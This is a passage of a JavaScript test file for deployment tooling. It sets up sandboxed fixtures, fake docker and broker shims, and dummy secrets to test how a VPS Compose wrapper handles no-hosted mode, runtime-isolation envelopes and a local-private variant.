    HOSTED_WORKLOAD_RUNTIME_LOCK_SOURCE: "",
  });
  return qa8EnvironmentMap(sandbox);
}

function qa8RepositoryGolden() {
  if (qa8RepositoryGoldenTemplate !== undefined) {
    return structuredClone(qa8RepositoryGoldenTemplate);
  }
  const outputDirectory =
    fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "hosted-golden-qa8-")));
  const outputPath = path.join(outputDirectory, "golden.json");
  try {
    const result = spawnSync("/usr/bin/ruby", [qa8GoldenParserPath], {
      encoding: "utf8",
      env: cleanEnvironment({
        ROOT: repositoryRoot,
        GOLDEN_OUT: outputPath,
      }),
    });
    assert.equal(
      result.status,
      0,
      `independent nine-overlay parser failed:\n${result.stderr}`,
    );
    qa8RepositoryGoldenTemplate = JSON.parse(fs.readFileSync(outputPath, "utf8"));
    return structuredClone(qa8RepositoryGoldenTemplate);
  } finally {
    fs.rmSync(outputDirectory, { recursive: true, force: true });
  }
}

function testComposeInterpolationEnd(value, offset) {
  let depth = 1;
  for (let index = offset + 2; index < value.length; index += 1) {
    if (value.startsWith("${", index)) {
      depth += 1;
      index += 1;
    } else if (value[index] === "}") {
      depth -= 1;
      if (depth === 0) return index;
    }
  }
  return -1;
}

function expandTestComposeTemplate(value, environment, depth = 0) {
  assert.equal(typeof value, "string");
  assert.ok(depth <= 16, "test Compose interpolation exceeded its closed depth");
  let expanded = "";
  for (let index = 0; index < value.length;) {
    if (!value.startsWith("${", index)) {
      expanded += value[index];
      index += 1;
      continue;
    }
    const end = testComposeInterpolationEnd(value, index);
    assert.notEqual(end, -1, `unterminated test Compose interpolation: ${value}`);
    const expression = value.slice(index + 2, end);
    const operator = expression.indexOf(":-");
    assert.notEqual(operator, -1, `unsupported test Compose interpolation: ${expression}`);
    const variable = expression.slice(0, operator);
    const fallback = expression.slice(operator + 2);
    assert.match(variable, /^[A-Za-z_][A-Za-z0-9_]*$/);
    const observed = environment.get(variable);
    expanded += observed === undefined || observed === ""
      ? expandTestComposeTemplate(fallback, environment, depth + 1)
      : observed;
    index = end + 1;
  }
  return expanded;
}

function readCoreTestEnvironment() {
  const environment = new Map([
    ["DOMAIN", "fixture.invalid"],
    ...requiredCoreEnvironmentLines.map((line) => {
      const separator = line.indexOf("=");
      return [line.slice(0, separator), line.slice(separator + 1)];
    }),
  ]);
  const environmentPath = path.join(fixtureRootDirectory, ".env");
  if (!fs.existsSync(environmentPath)) return environment;
  const bytes = fs.readFileSync(environmentPath, "utf8");
  for (const line of bytes.replaceAll("\r\n", "\n").split("\n")) {
    if (/^\s*(?:#.*)?$/.test(line)) continue;
    const match = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/.exec(line);
    assert.ok(match, `invalid core test dotenv line: ${line}`);
    environment.set(match[1], match[2]);
  }
  return environment;
}

function materializeCoreTestEnvironment(config, environment) {
  const authority = coreSemanticPolicyDescriptor.serviceEnvironmentAuthority.services;
  for (const [serviceName, service] of Object.entries(config.services)) {
    const serviceAuthority = authority[serviceName];
    assert.ok(serviceAuthority, `missing environment authority for ${serviceName}`);
    if (!serviceAuthority.present) {
      delete service.environment;
      continue;
    }
    service.environment = Object.fromEntries(
      Object.entries(serviceAuthority.entries).map(([key, projection]) => {
        if (Object.hasOwn(projection, "literal")) return [key, projection.literal];
        if (Object.hasOwn(projection, "required")) {
          const value = environment.get(projection.variable);
          assert.ok(value, `missing required core test environment ${projection.variable}`);
          return [key, value];
        }
        const template = projection.template
          ?? `\${${projection.variable}:-${projection.fallback}}`;
        return [key, expandTestComposeTemplate(template, environment)];
      }),
    );
  }
}

function rewriteRepositoryGoldenPaths(value, root, siblingSource) {
  if (Array.isArray(value)) {
    return value.map((entry) => rewriteRepositoryGoldenPaths(entry, root, siblingSource));
  }
  if (value !== null && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value)
        .map(([key, entry]) => [
          key,
          rewriteRepositoryGoldenPaths(entry, root, siblingSource),
        ]),
    );
  }
  if (typeof value !== "string") return value;
  const repositorySource = path.resolve(repositoryRoot, "../compose-source");
  if (value === repositorySource || value.startsWith(`${repositorySource}${path.sep}`)) {
    return `${siblingSource}${value.slice(repositorySource.length)}`;
  }
  if (value === repositoryRoot || value.startsWith(`${repositoryRoot}${path.sep}`)) {
    return `${root}${value.slice(repositoryRoot.length)}`;
  }
  return value;
}

function coreTestGoldenConfig(inventory) {
  const siblingSource = path.resolve(fixtureRootDirectory, "../src");
  const config = rewriteRepositoryGoldenPaths(
    qa8RepositoryGolden(),
    fixtureRootDirectory,
    siblingSource,
  );
  for (const kind of protectedKinds) {
    config[kind] = Object.fromEntries(
      inventory[kind].map((name) => {
        assert.ok(Object.hasOwn(config[kind], name), `unknown core test ${kind} entry: ${name}`);
        return [name, config[kind][name]];
      }),
    );
  }
  const environment = readCoreTestEnvironment();
  materializeCoreTestEnvironment(config, environment);
  for (const [secretName, variable] of Object.entries(
    coreSemanticPolicyDescriptor.secretFileVariables,
  )) {
    const relative = environment.get(variable)
      || coreSemanticPolicyDescriptor.secretFiles[secretName];
    config.secrets[secretName].file = path.resolve(fixtureRootDirectory, relative);
  }
  if (fixtureRootDirectory !== repositoryRoot && fs.existsSync(fixtureRootDirectory)) {
    materializeQa8CanonicalSources({
      root: fixtureRootDirectory,
      cleanupRoot: path.dirname(fixtureRootDirectory),
      canonicalLock: path.join(
        fixtureRootDirectory,
        "config",
        "no-hosted-workloads.lock.json",
      ),
    }, config);
  }
  return config;
}

function rewriteQa8GoldenPaths(value, sandbox) {
  return rewriteRepositoryGoldenPaths(
    value,
    sandbox.root,
    path.join(sandbox.cleanupRoot, "compose-source"),
  );
}

function qa8IndependentGolden(sandbox) {
  return rewriteQa8GoldenPaths(qa8RepositoryGolden(), sandbox);
}

function qa8LegacyCompatibleGolden(sandbox) {
  const config = qa8IndependentGolden(sandbox);
  config.services.nats.entrypoint = [
    "/bin/sh",
    "-ec",
    'NATS_PASSWORD="$$(cat "$$NATS_PASSWORD_FILE")"; '
      + 'exec nats-server -c /etc/nats/nats-server.conf '
      + '--user "$$NATS_USER" --pass "$$NATS_PASSWORD"\n',
  ];
  return config;
}

function qa8KnownCompatibilityViolations(violations) {
  const joined = violations.join("\n");
  return /render:exact-authority-digest|runtime-isolation|nats:(?:process-model|entrypoint)/i.test(joined);
}

function selectQa8AcceptedBaseline(sandbox, lock, environment) {
  const candidateDefinitions = [
    ["independent", qa8IndependentGolden(sandbox)],
    ["legacy-compatible", qa8LegacyCompatibleGolden(sandbox)],
  ];
  materializeQa8CanonicalSources(sandbox, candidateDefinitions[0][1]);
  const candidates = candidateDefinitions.map(([label, config]) => ({
    label,
    config,
    violations: validateNoHostedCoreAuthority(
      lock,
      config,
      sandbox.root,
      environment,
    ),
  }));
  const accepted = candidates.filter(({ violations }) => violations.length === 0);
  assert.equal(
    accepted.length,
    1,
    `expected exactly one accepted golden variant: ${JSON.stringify(
      candidates.map(({ label, violations }) => ({ label, violations })),
    )}`,
  );
  const rejected = candidates.find(({ violations }) => violations.length !== 0);
  assert.ok(rejected, "the non-authoritative compatibility variant was unexpectedly absent");
  assert.ok(rejected.violations.length >= 1, "legacy compatibility mutant was not rejected");
  assert.equal(
    qa8KnownCompatibilityViolations(rejected.violations),
    true,
    `compatibility delta did not reach exact authority: ${rejected.violations.join(",")}`,
  );
  return accepted[0];
}

const qa8DirectoryMountTargets = new Set([
  "/app",
  "/docker-entrypoint-initdb.d",
  "/etc/coredns",
  "/etc/grafana/provisioning",
  "/etc/mysql/conf.d",
  "/etc/mysql/ssl",
  "/etc/phpmyadmin/certs",
  "/infra",
  "/infra/backups",
  "/infra/reports",
  "/loki/rules",
  "/opt/keycloak/data/import",
  "/platform-postgres-init",
  "/project",
  "/var/lib/grafana/dashboards",
  "/var/lib/node-exporter/textfile",
  "/var/www/infra-docs",
  "/var/www/project-state",
  "/var/www/projects",
  "/etc/prometheus/rules",
]);

function materializeQa8CanonicalSources(sandbox, config) {
  fs.mkdirSync(path.join(sandbox.cleanupRoot, "compose-source"), {
    recursive: true,
    mode: 0o755,
  });
  for (const [secretName, definition] of Object.entries(config.secrets ?? {})) {
    assert.equal(typeof definition?.file, "string", `missing ${secretName} secret path`);
    fs.mkdirSync(path.dirname(definition.file), { recursive: true, mode: 0o755 });
    const mode = secretName === "alertmanager_webhook_token" ? 0o640 : 0o600;
    fs.writeFileSync(definition.file, `qa8-${secretName}\n`, { mode });
    fs.chmodSync(definition.file, mode);
  }
  for (const service of Object.values(config.services ?? {})) {
    for (const mount of service.volumes ?? []) {
      if (mount?.type !== "bind" || typeof mount.source !== "string") continue;
      const inRoot =
        mount.source === sandbox.root || mount.source.startsWith(`${sandbox.root}${path.sep}`);
      const siblingSource = path.join(sandbox.cleanupRoot, "compose-source");
      const inSibling =
        mount.source === siblingSource || mount.source.startsWith(`${siblingSource}${path.sep}`);
      if (!inRoot && !inSibling) continue;
      if (mount.source === sandbox.root || qa8DirectoryMountTargets.has(mount.target)) {
        fs.mkdirSync(mount.source, { recursive: true, mode: 0o755 });
        continue;
      }
      if (mount.target === "/run/platform/hosted-workloads.lock.json"
          && fs.existsSync(mount.source)) {
        continue;
      }
      fs.mkdirSync(path.dirname(mount.source), { recursive: true, mode: 0o755 });
      const repositoryPath = inRoot
        ? `${repositoryRoot}${mount.source.slice(sandbox.root.length)}`
        : `${path.resolve(repositoryRoot, "../compose-source")}${
          mount.source.slice(siblingSource.length)
        }`;
      if (fs.existsSync(repositoryPath) && fs.lstatSync(repositoryPath).isFile()) {
        fs.copyFileSync(repositoryPath, mount.source);
      } else {
        fs.writeFileSync(mount.source, `qa8-source:${mount.target}\n`, { mode: 0o644 });
      }
      fs.chmodSync(
        mount.source,
        mount.target === "/usr/local/bin/platform-postgres-entrypoint" ? 0o755 : 0o644,
      );
    }
  }
}

function installCountingRenderer(sandbox) {
  const renderCountFile = path.join(sandbox.root, "docker-render-count");
  fs.writeFileSync(renderCountFile, "0\n", { mode: 0o600 });
  writeExecutable(path.join(sandbox.root, "bin", "docker"), `#!/bin/sh
set -eu
sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
render_count_file="$sandbox_root/docker-render-count"
count=0
if [ -f "$render_count_file" ]; then
  IFS= read -r count < "$render_count_file"
fi
count=$((count + 1))
printf '%s\\n' "$count" > "$render_count_file"
/bin/cat "$sandbox_root/docker-output.json"
`);
  return {
    count() {
      return Number.parseInt(fs.readFileSync(renderCountFile, "utf8").trim(), 10);
    },
    reset() {
      fs.writeFileSync(renderCountFile, "0\n", { mode: 0o600 });
    },
  };
}

function runCoreStackNoHostedScenario(config, { materializeSources = false } = {}) {
  const cleanupRoot =
    fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), "core-stack-no-hosted-qa7-")));
  const infrastructureRoot = path.join(cleanupRoot, "platform-infrastructure");
  const commitSha = "1".repeat(40);
  const sourceArchiveSha256 = "3".repeat(64);
  const releaseId = `${commitSha}-${sourceArchiveSha256}`;
  const releaseStore = path.join(infrastructureRoot, "releases");
  const root = path.join(releaseStore, releaseId);
  fs.mkdirSync(root, { recursive: true });
  fs.mkdirSync(path.join(releaseStore, "compose-source"));
  config = structuredClone(config);
  for (const secretName of Object.keys(config.secrets)) {
    config.secrets[secretName] = {
      file: path.join(root, coreSemanticPolicyDescriptor.secretFiles[secretName]),
      name: `platform_infra_vps_${secretName}`,
    };
  }
  for (const [serviceName, service] of Object.entries(config.services)) {
    if (service.build) service.build.context = root;
    for (const mount of service.volumes ?? []) {
      const rules = coreSemanticPolicyDescriptor.bindSourceRules[serviceName]?.[mount.target];
      const privilegedRootSources = {
        "/broker/render-workload-broker-config.mjs": "scripts/render-workload-broker-config.mjs",
        "/broker/workload-broker-policy.mjs": "scripts/workload-broker-policy.mjs",
        "/run/platform/hosted-workloads.lock.json": "config/no-hosted-workloads.lock.json",
      };
      if ((!rules || rules.length !== 1) && privilegedRootSources[mount.target]) {
        mount.source = path.resolve(root, privilegedRootSources[mount.target]);
        continue;
      }
      if (!rules || rules.length !== 1) continue;
      const [rule] = rules;
      mount.source = rule.startsWith("root:")
        ? path.resolve(root, rule.slice("root:".length))
        : path.resolve(root, "../compose-source");
    }
  }
  const fakeBin = path.join(root, "bin");
  const stateDirectory = path.join(infrastructureRoot, "platform-activation");
  fs.mkdirSync(fakeBin);
  fs.mkdirSync(stateDirectory, { recursive: true });
  const gate = copyRepositoryFile(root, "scripts/core-stack-activation-gate.sh");
  if (process.platform === "linux") {
    const source = fs.readFileSync(gate, "utf8");
    const systemProbe = "SYSTEM_NAME=$(/usr/bin/uname -s)";
    assert.equal(
      source.split(systemProbe).length - 1,
      1,
      "core activation fixture must contain one exact OS test boundary",
    );
    fs.writeFileSync(gate, source.replace(systemProbe, "SYSTEM_NAME=Darwin"), { mode: 0o755 });
  }
  const composeVps = copyRepositoryFile(root, "scripts/compose-vps.sh");
  copyRepositoryFile(root, "scripts/no-hosted-core-policy.mjs");
  copyRepositoryFile(root, "scripts/runtime-isolation-policy.mjs");
  copyRepositoryFile(root, "config/no-hosted-workloads.lock.json");
  fs.copyFileSync(
    path.join(repositoryRoot, "scripts", "platform-release-context.mjs"),
    path.join(root, "scripts", "platform-release-context-implementation.mjs"),
  );
  fs.chmodSync(gate, 0o755);
  fs.chmodSync(composeVps, 0o755);

  const modelPath = path.join(root, "candidate-render.json");
  fs.writeFileSync(modelPath, `${JSON.stringify(config)}\n`, { mode: 0o600 });
  const extensionServices = new Set([
    "project-router", "postgres", "redis", "nats", "keycloak", "minio", "prometheus",
  ]);
  const mutableServices = Object.keys(config.services)
    .filter((serviceName) => !extensionServices.has(serviceName))
    .sort();
  const idsPath = path.join(root, "container-ids");
  fs.writeFileSync(idsPath, `${mutableServices.map((serviceName) => `cid-${serviceName}`).join("\n")}\n`);
  const inspections = mutableServices.map((serviceName) => ({
    Config: {
      Labels: {
        "com.docker.compose.project": "platform_infra_vps",
        "com.docker.compose.service": serviceName,
      },
      Image: config.services[serviceName].image,
    },
    State: { Running: true },
  }));
  const inspectPath = path.join(root, "inspect.json");
  fs.writeFileSync(inspectPath, `${JSON.stringify(inspections)}\n`, { mode: 0o600 });

  writeExecutable(path.join(root, "scripts", "platform-activation-broker.py"), `#!/usr/bin/env node
const [command, descriptor, token, action] = process.argv.slice(2);
if (command !== "client"
    || descriptor !== process.env.PLATFORM_ACTIVATION_BROKER_FD
    || token !== process.env.PLATFORM_ACTIVATION_BROKER_TOKEN) process.exit(64);
if (action === "ping") {
  process.stdout.write(JSON.stringify({
    version: "platform-activation-broker/v1",
    coordinator: process.env.PLATFORM_ACTIVATION_STATE_DIR,
    supervisorPid: 2
  }));
} else if (action === "snapshot") {
  process.stdout.write(JSON.stringify({
    journal: {
      version: 2,
      state: "pending",
      transactionId: process.env.PLATFORM_ACTIVATION_TRANSACTION_ID,
      projectName: "platform_infra_vps",
      releaseContextPath: process.env.QA7_RELEASE_CONTEXT_PATH,
      releaseContextSha256: process.env.QA7_RELEASE_CONTEXT_SHA256,
      phase: "intent"
    },
    active: null
  }));
} else {
  process.exit(64);
}
`);
  writeExecutable(path.join(fakeBin, "timeout"), `#!/bin/sh
set -eu
shift
exec "$@"
`);
  const engineLog = path.join(root, "fake-engine.log");
  writeExecutable(path.join(fakeBin, "docker"), `#!/bin/sh
set -eu
sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
printf '%s\\n' "$*" >> "$sandbox_root/fake-engine.log"
if [ "\${1:-}" = "compose" ]; then
  /bin/cat "$sandbox_root/candidate-render.json"
  exit 0
fi
if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "info" ]; then
  printf '%s\\n' "daemon-qa7"
  exit 0
fi
if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "compose" ]; then
  case " $* " in
    *" create "*) exit 0 ;;
    *" ps -aq "*)
      /bin/cat "$sandbox_root/container-ids"
      exit 0
      ;;
  esac
fi
if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "start" ]; then
  exit 0
fi
if [ "\${1:-}" = "--host" ] && [ "\${3:-}" = "inspect" ]; then
  /bin/cat "$sandbox_root/inspect.json"
  exit 0
fi
printf '%s\\n' "UNEXPECTED_DOCKER_CALL $*" >> "$sandbox_root/fake-engine.log"
exit 97
`);

  const canonicalLock = path.join(root, "config", "no-hosted-workloads.lock.json");
  const releaseEnvironment = qa8EnvironmentObject({
    root,
    cleanupRoot: releaseStore,
    canonicalLock,
  });
  const environmentBytes = [
    "HOSTED_WORKLOAD_LOCK=",
    "HOSTED_WORKLOAD_MODE=no-hosted",
    ...Object.entries(releaseEnvironment).map(([key, value]) => `${key}=${value}`),
    "",
  ].join("\n");
  const environmentSha256 = sha256(environmentBytes);
  const stateId = `${releaseId}-${environmentSha256}`;
  const releaseStateRoot = path.join(infrastructureRoot, "release-states", stateId);
  fs.mkdirSync(releaseStateRoot, { recursive: true });
  const environmentFile = path.join(releaseStateRoot, "environment.env");
  fs.writeFileSync(environmentFile, environmentBytes, { mode: 0o640 });
  fs.chmodSync(environmentFile, 0o640);
  fs.writeFileSync(path.join(root, ".env.vps.example"), environmentBytes, { mode: 0o600 });
  const releaseContextPath = path.join(releaseStateRoot, "trusted-release-context.json");
  const releaseContext = {
    schema: "platform-trusted-release-context/v3",
    repository: "owner/platform-infrastructure",
    commitSha,
    treeSha: "2".repeat(40),
    sourceArchiveSha256,
    releaseId,
    releaseRoot: root,
    stateId,
    stateRoot: releaseStateRoot,
    environmentFile,
    environmentSha256,
    projectName: "platform_infra_vps",
    decisionId: "decision:12345678",
    provider: {
      metadataSha256: "4".repeat(64),
      runId: "12345678",
      attempt: 1,
      challenge: "5".repeat(64),
    },
    receipts: {
      artifactSha256: "6".repeat(64),
      deploymentSha256: "7".repeat(64),
      dastProviderSha256: "8".repeat(64),
      dastAuthorizationSha256: "9".repeat(64),
    },
    dastChainSha256: "a".repeat(64),
    runtimeIntentSha256: "b".repeat(64),
    subjects: [
      {
        serviceName: "app",
        imageReference: `ghcr.io/owner/platform-infrastructure-app@sha256:${"c".repeat(64)}`,
        imageId: `sha256:${"d".repeat(64)}`,
      },
      {
        serviceName: "backup-scheduler",
        imageReference: `ghcr.io/owner/platform-infrastructure-backup-scheduler@sha256:${"e".repeat(64)}`,
        imageId: `sha256:${"f".repeat(64)}`,
      },
    ],
    hostedLockSha256: null,
    noHosted: true,
    sourceRenderSha256: "0".repeat(64),
    combinedRenderSha256: "1".repeat(64),
    persistentVolumes: [{
      name: "enterprise_local_registry_data",
      createdAt: "2026-07-21T00:00:00.000Z",
      driver: "local",
      scope: "local",
      options: {},
      labels: {
        "platform.infrastructure.managed": "true",
        "platform.infrastructure.purpose": "local-registry",
      },
      mountpoint: "/var/lib/docker/volumes/enterprise_local_registry_data/_data",
      owner: { uid: 0, gid: 0, mode: "0755" },
    }],
  };
  fs.writeFileSync(releaseContextPath, `${JSON.stringify(releaseContext)}\n`, { mode: 0o640 });
  fs.chmodSync(releaseContextPath, 0o640);
  const releaseContextSha256 = sha256(fs.readFileSync(releaseContextPath));
  writeExecutable(path.join(root, "scripts", "platform-release-context.mjs"), `#!/usr/bin/env node
import { createPlatformReleaseContextTestReader } from "./platform-release-context-implementation.mjs";
const read = createPlatformReleaseContextTestReader({
  infrastructureRoot: ${JSON.stringify(infrastructureRoot)},
  expectedOwner: process.getuid(),
});
try {
  if (process.argv.length !== 4 || process.argv[2] !== "read") throw new Error("invalid test reader argv");
  process.stdout.write(JSON.stringify(read(process.argv[3])) + "\\n");
} catch (error) {
  process.stderr.write(String(error?.message ?? error) + "\\n");
  process.exitCode = 1;
}
`);
  const scenarioSandbox = {
    cleanupRoot: releaseStore,
    root,
    canonicalLock,
    environmentFile,
    environment: {},
  };
  if (materializeSources) materializeQa8CanonicalSources(scenarioSandbox, config);
  const result = spawnSync("/bin/bash", [
    gate,
    "--project-name", "platform_infra_vps",
    "--env-file", environmentFile,
    "--release-context", releaseContextPath,
    "--no-hosted-workloads",
    "--action", "activate",
    "--confirm", "ACTIVATE-CORE-STACK",
  ], {
    cwd: root,
    env: cleanEnvironment({
      PATH: `${fakeBin}:${process.env.PATH}`,
      PLATFORM_ACTIVATION_TRANSACTION_ID: "a".repeat(64),
      PLATFORM_ACTIVATION_EXPECTED_DAEMON_ID: "daemon-qa7",
      PLATFORM_ACTIVATION_STATE_DIR: stateDirectory,
      PLATFORM_ACTIVATION_BROKER_FD: "101",
      PLATFORM_ACTIVATION_BROKER_TOKEN: "b".repeat(64),
      QA7_RELEASE_CONTEXT_PATH: releaseContextPath,
      QA7_RELEASE_CONTEXT_SHA256: releaseContextSha256,
      QA7_CONTAINER_IDS: idsPath,
      QA7_ENGINE_LOG: engineLog,
      QA7_INSPECT_MODEL: inspectPath,
      QA7_RENDER_MODEL: modelPath,
      TMPDIR: root,
    }),
    encoding: "utf8",
    timeout: 30_000,
  });
  const log = fs.existsSync(engineLog) ? fs.readFileSync(engineLog, "utf8") : "";
  return { root: cleanupRoot, result, log };
}

function activationBundle(sandbox, protectedResourceNames, combinedRenderBytes) {
  const coreEnvironmentPath = fs.realpathSync.native(sandbox.environmentFile);
  const stat = fs.statSync(coreEnvironmentPath);
  return {
    version: 2,
    lockSha256: sha256(fs.readFileSync(sandbox.workloadLock)),
    coreRenderSha256: "c".repeat(64),
    combinedRenderSha256: sha256(combinedRenderBytes),
    coreEnvFile: coreEnvironmentPath,
    coreEnvironmentRecord: {
      path: coreEnvironmentPath,
      sha256: sha256(fs.readFileSync(coreEnvironmentPath)),
      device: String(stat.dev),
      inode: String(stat.ino),
      uid: String(stat.uid),
      mode: stat.mode & 0o777,
    },
    projectName: "platform_infra_vps",
    workloadIds: ["example-app"],
    protectedNetworkNames: protectedResourceNames.networks,
    protectedResourceNames,
    networkRecords: [{
      workloadId: "example-app",
      logicalName: "example_app_ingress",
      physicalName: "platform_infra_vps_example_app_ingress",
    }],
    serviceRecords: [{ workloadId: "example-app", serviceName: "example-app-web" }],
    routeRecords: [],
    platformExtensionRecords: [],
    environmentRecords: [],
    composeRecords: [],
  };
}

function writeActivationBundle(sandbox, bundle) {
  fs.writeFileSync(sandbox.activationBundleFile, `${JSON.stringify(bundle)}\n`, { mode: 0o600 });
}

test("production runtime-isolation consumer binds the authoritative Hosted activation inventory", () => {
  assert.match(
    runtimeIsolationConsumer,
    /compose-vps\.sh/,
    "runtime-isolation-check bypasses the read-once VPS Compose/activation consumer",
  );
  assert.match(
    runtimeIsolationConsumer,
    /runtime-isolation-envelope/,
    "runtime-isolation-check does not request one semantic runtime-isolation envelope",
  );
  for (const field of ["config", "lockSha256", "projectName", "protectedResourceNames"]) {
    assert.match(
      runtimeIsolationConsumer,
      new RegExp(`\\b${field}\\b`),
      `runtime-isolation-check does not validate the closed envelope field ${field}`,
    );
  }
  assert.match(
    runtimeIsolationConsumer,
    /evaluateRuntimeIsolation\(\s*(?:runtimeIsolationEnvelope|envelope)\.config\s*,\s*\{[\s\S]*?projectName\s*:\s*(?:runtimeIsolationEnvelope|envelope)\.projectName[\s\S]*?protectedResourceNames\s*:\s*(?:runtimeIsolationEnvelope|envelope)\.protectedResourceNames[\s\S]*?\}\s*\)/,
    "runtime-isolation-check does not pass the envelope identity and inventory into the semantic runtime policy",
  );
  assert.doesNotMatch(
    runtimeIsolationConsumer,
    /protectedResourceNames\s*[:=][\s\S]{0,400}Object\.keys\(\s*config/,
    "runtime-isolation-check derives protected-resource authority from the rendered config",
  );
  assert.doesNotMatch(
    runtimeIsolationConsumer,
    /(?:readFileSync|readJsonFile|hosted-workload-lock\.sh)[\s\S]{0,200}HOSTED_WORKLOAD_LOCK|HOSTED_WORKLOAD_LOCK[\s\S]{0,200}(?:readFileSync|readJsonFile|hosted-workload-lock\.sh)/,
    "runtime-isolation-check re-reads the Hosted lock instead of consuming the read-once envelope",
  );
  assert.doesNotMatch(
    runtimeIsolationConsumer,
    /argv\.(?:protectedResourceNames|protectedResources|workloadLock)/,
    "runtime-isolation-check permits a CLI override of the authoritative envelope",
  );
});

test("VPS wrapper emits one closed envelope from the same read-once activation bundle", () => {
  assert.match(
    composeVpsSource,
    /runtime-isolation-envelope/,
    "compose-vps.sh has no exact semantic-envelope mode",
  );
  const activationReads = [...composeVpsSource.matchAll(
    /hosted-workload-lock\.sh["']?\s+"\$workload_lock"\s+activation-bundle/g,
  )];
  assert.equal(activationReads.length, 1, "compose-vps.sh must read the Hosted activation bundle exactly once");
  assert.match(
    composeVpsSource,
    /runtime-isolation-envelope[\s\S]*activation_bundle[\s\S]*projectName[\s\S]*lockSha256[\s\S]*protectedResourceNames[\s\S]*config/,
    "semantic-envelope mode is not assembled from the same activation bundle and Compose render",
  );
  assert.doesNotMatch(
    composeVpsSource,
    /protectedResourceNames\s*[:=][\s\S]{0,400}(?:keys|Object\.keys)\s*\([^)]*(?:config|render)/,
    "compose-vps.sh derives protected resources from the combined render",
  );
  assert.match(
    composeVpsSource,
    /(?:HOSTED_WORKLOAD_MODE|NO_HOSTED|--no-hosted)[\s\S]*no-hosted-workloads\.lock\.json/,
    "an empty lock is treated as no-hosted without an explicit mode and canonical core lock",
  );
});

test("VPS wrapper derives a core-only envelope only in explicit canonical no-hosted mode", () => {
  const sandbox = createConsumerSandbox();
  try {
    const config = coreAuthorityConfig();
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);
    const implicit = runWrapper(sandbox, ["runtime-isolation-envelope"], {
      HOSTED_WORKLOAD_MODE: "",
    });
    assert.notEqual(implicit.status, 0);
    assert.match(implicit.stderr, /explicit HOSTED_WORKLOAD_MODE=no-hosted/);
    assert.equal(fs.existsSync(sandbox.dockerMarker), false);

    const explicit = runWrapper(sandbox, ["runtime-isolation-envelope"], {
      HOSTED_WORKLOAD_MODE: "no-hosted",
    });
    assert.equal(explicit.status, 0, explicit.stderr);
    const envelope = JSON.parse(explicit.stdout);
    assert.deepEqual(Object.keys(envelope).sort(), [
      "config", "lockSha256", "projectName", "protectedResourceNames", "version",
    ]);
    assert.equal(envelope.version, 1);
    assert.equal(envelope.projectName, "platform_infra_vps");
    assert.deepEqual(envelope.config, config);
    assert.deepEqual(envelope.protectedResourceNames, expectedCoreInventory);
    assert.equal(
      envelope.lockSha256,
      crypto.createHash("sha256").update(fs.readFileSync(sandbox.canonicalLock)).digest("hex"),
    );
    const rendererArguments = fs.readFileSync(sandbox.dockerArgumentsCapture, "utf8").trim();
    const renderedMarker = fs.existsSync(sandbox.dockerMarker);
    assert.equal(renderedMarker, true, "semantic envelope did not invoke the fake config renderer");
    assert.match(rendererArguments, /--profile backup config --format json$/);
    assert.doesNotMatch(
      rendererArguments,
      /(?:^|\s)(?:build|create|down|exec|kill|pull|push|restart|rm|run|start|stop|up)(?:\s|$)/,
      "read-only semantic envelope reached a mutating Compose subcommand",
    );
  } finally {
    removeSandbox(sandbox);
  }
});

test("LOCAL_PRIVATE Compose variant is explicit, no-hosted-only and appended after isolation", () => {
  const sandbox = createConsumerSandbox();
  try {
    const config = coreAuthorityConfig();
    writeDockerOutput(sandbox, `${JSON.stringify(config)}\n`);

    const standard = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(standard.status, 0, standard.stderr);
    const standardArguments = fs.readFileSync(sandbox.dockerArgumentsCapture, "utf8").trim();
    assert.doesNotMatch(standardArguments, /compose\.local-private\.yaml/);

    const localPrivateConfig = structuredClone(config);
    localPrivateConfig.secrets.control_center_first_configuration_bootstrap_token = {};
    localPrivateConfig.secrets.control_center_first_configuration_keycloak_client_secret = {};
    writeDockerOutput(sandbox, `${JSON.stringify(localPrivateConfig)}\n`);
    fs.writeFileSync(
      path.join(sandbox.scripts, "no-hosted-core-policy.mjs"),
      "process.exit(0);\n",
    );
    fs.appendFileSync(sandbox.environmentFile, "PLATFORM_COMPOSE_VARIANT=LOCAL_PRIVATE\n");
    const localPrivate = runWrapper(sandbox, ["config", "--format", "json"], {
      PLATFORM_COMPOSE_VARIANT: "LOCAL_PRIVATE",
    });
    assert.equal(localPrivate.status, 0, localPrivate.stderr);
    const localPrivateArguments = fs.readFileSync(sandbox.dockerArgumentsCapture, "utf8").trim();
    assert.match(
      localPrivateArguments,
      /-f compose\.runtime-isolation\.yaml -f compose\.local-private\.yaml --profile backup config --format json$/,
    );
    const localPrivateRuntimeIdentity = runWrapper(sandbox, ["config", "--format", "json"], {
      PLATFORM_COMPOSE_VARIANT: "LOCAL_PRIVATE",
      PLATFORM_RUNTIME_CANDIDATE_ID: "1".repeat(64),
      PLATFORM_RUNTIME_COMMIT: "2".repeat(40),
      PLATFORM_RUNTIME_TREE: "3".repeat(40),
      PLATFORM_RUNTIME_DEPLOYMENT_ID: "local-private-deployment",
      PLATFORM_RUNTIME_SOURCE_RENDER_SHA256: "4".repeat(64),
      PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256: "5".repeat(64),
    });
    assert.equal(localPrivateRuntimeIdentity.status, 0, localPrivateRuntimeIdentity.stderr);
    assert.match(
      fs.readFileSync(sandbox.dockerArgumentsCapture, "utf8").trim(),
      /-f compose\.local-private\.yaml -f compose\.runtime-identity\.yaml --profile backup config --format json$/,
    );

    const localAppend = composeVpsSource.indexOf("compose+=(-f compose.local-private.yaml)");
    const runtimeIdentityAppend = composeVpsSource.indexOf("compose+=(-f compose.runtime-identity.yaml)");
    assert.ok(localAppend >= 0, "LOCAL_PRIVATE overlay append is missing");
    assert.ok(runtimeIdentityAppend > localAppend, "runtime identity is not appended after LOCAL_PRIVATE");

    for (const variant of ["", "local_private", "Local_Private", "VPS ", "PRODUCTION", "LOCAL_PRIVATE_V2"]) {
      fs.rmSync(sandbox.dockerMarker, { force: true });
      const rejected = runWrapper(sandbox, ["config", "--format", "json"], {
